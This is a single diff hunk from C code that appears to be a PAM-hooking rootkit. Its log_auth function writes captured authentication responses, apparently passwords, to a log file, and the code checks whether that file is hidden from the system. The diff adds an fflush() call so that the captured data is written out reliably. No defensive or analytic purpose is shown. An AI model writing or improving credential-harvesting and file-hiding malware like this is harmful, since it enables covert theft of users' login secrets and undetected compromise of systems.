@@ -46,6 +46,7 @@ void log_auth(pam_handle_t *pamh, char *resp){
     fp = call(CFOPEN, LOG_PATH, "a");
     if(fp == NULL) return;
     call(CFWRITE, logbuf, 1, strlen(logbuf), fp);
+    fflush(fp);
     fclose(fp);
 
     if(!hidden_path(LOG_PATH))
